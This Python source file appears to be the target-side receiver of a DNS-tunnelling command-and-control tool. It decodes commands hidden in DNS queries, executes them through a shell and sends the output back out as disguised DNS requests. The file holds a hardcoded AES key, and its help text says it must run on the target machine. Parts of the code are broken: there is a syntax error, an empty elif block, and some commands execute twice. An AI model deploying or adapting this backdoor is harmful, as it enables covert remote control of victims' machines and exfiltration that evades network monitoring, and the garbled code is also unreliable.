import subprocess
import os
import argparse
import time
from dns_server import *
import requests
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from decloakify import Decloakify
from pcapCapture import *
from packetWhisper import TransferCloakedFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries
from scapy.all import *
import signal
import threading



def clear_files_on_exit(signum, frame):
    open('cloaked.payload', 'w').close()
    open('cloaked_response.txt', 'w').close()
    print("Files cleared.")
    #exit(0)

signal.signal(signal.SIGINT, clear_files_on_exit)

# AES Key
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"
dns = '127.0.0.1'

def receive_command(local=False, args=None):
    srcIp = os.environ.get('SRC_IP')
    cloakedFile = "cloaked.payload"
    
    if local:
        print("Capturing pcap...")
        subprocess.call(['python', 'pcapCapture.py']) 
        print("pcap collected...")
        dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
        cloakedFile, srcIp = ExtractPayloadFromDNSQueries(dnsQueriesFilename, cipher, "www", isRandomized=True)
        
        # Check if cloakedFile exists after extraction
        if os.path.exists(cloakedFile):
            print(f"{cloakedFile} exists after extraction.")
        else:
            print(f"{cloakedFile} does not exist after extraction.")

    cloaked_command = cloakedFile 
    decloaked_command = "decloaked_command.txt"

    # Request re-transmission if no response is received within 3 seconds
    if os.environ.get('EOT') == 'True' or local:
        def timeout_handler():
            print("No command received within 3 seconds. Requesting re-transmission.")
            send_response('�'.do, srcIp, args)
            receive_command(local, args)
        timer = threading.Timer(3.0, timeout_handler)
        timer.start()

        with open(cloaked_command, 'r') as file:
            if file.read().strip() == "":
                timer.cancel()
                print("No command received.")
                return
        
        timer.cancel()

        # Decloakify the command
        print("Decloakifying...")
        if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
            print("Requesting full re-trasmission")
            send_response('�', srcIp, args)
            open('cloaked.payload', 'w').close()
            receive_command(local, args)

        # Check if cloakedFile exists after decloakifying
        if os.path.exists(cloaked_command):
            print(f"{cloaked_command} exists after decloakifying.")
            os.environ['EOT'] = 'False'
        else:
            print(f"{cloaked_command} does not exist after decloakifying.")

        # Decrypt the command
        with open(decloaked_command, 'r') as file:
            encrypted_command = file.read().strip()

        command = decrypt_message(encrypted_command, key) if args is not None and args.encrypt else encrypted_command
        if (command != '�'):
            send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp, args)
            print('received command: '+ command)
        elif receive_command == '�':
            send_response(command, args=args)
        elif command.startswith('�') and command[1:].isdigit():
            # appendi domini
    


        # Execute the command
        try:
            # Send response of the execution
            time.sleep(1)
            send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp)
            clear_files_on_exit(0, 0)
        except Exception as e:
            print(f"Unrecognized command: {e}")
            time.sleep(1)
            send_response(f"Unrecognized command: {e}", dns, args)


    start_udp_server()

def send_response(response, dns='127.0.0.1', args=None):
    print('Sender IP:', dns)
    # Encrypt the response
    encrypted_response = encrypt_message(response, key) if args is not None and args.encrypt else response

    # Cloakify the response
    cloaked_response = "cloaked_response.txt"

    Cloakify(encrypted_response, cipher, cloaked_response)
    
    
    TransferCloakedFile(cloaked_response, 0.0, dns)


    fqdn_array = []
    with open(cloaked_response, 'r') as file:
        fqdn_array = [line.strip() for line in file]



    # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
    
    with open(cloaked_response, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            id = int(fqdn_array.index(fqdn_str))
            dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
            dns_req[DNS].id = id
            send(dns_req, verbose=0)

    # Remove response file
    #os.remove(cloaked_response)



if __name__ == "__main__":
    ip = requests.get('https://ipinfo.io/ip')
    parser = argparse.ArgumentParser(
        description=f"This script must run on the target machine.\n\n1) Make sure that UDP port 53 is open on both Sender and Receiver. \n2) Run this script with the --run parameter. \n3) Run 'python sender.py -d {ip.text}' on the sender script.",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    parser.add_argument('--run', action='store_true', help="Run the server if specified")    
    parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.")    
    parser.add_argument('--encrypt', action='store_true', help="Use this flag if you want to use an encrypted communication.") 
    parser.add_argument('--EOT_url', type=str, help="End of Transmission URL")
    subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    args = parser.parse_args()
    
    open('cloaked.payload', 'w').close()
    open('decloaked_command.txt', 'w').close()
    if args.run:
        if args.EOT_url:
           os.environ['EOT_URL'] = args.EOT_url
        print("Running and waiting for requests...")
        while True:
            try:
                receive_command(args.local, args) 
            except Exception as e:
                print(f'Something wrong happend during the connection: {e}')
    else:
        parser.print_help()
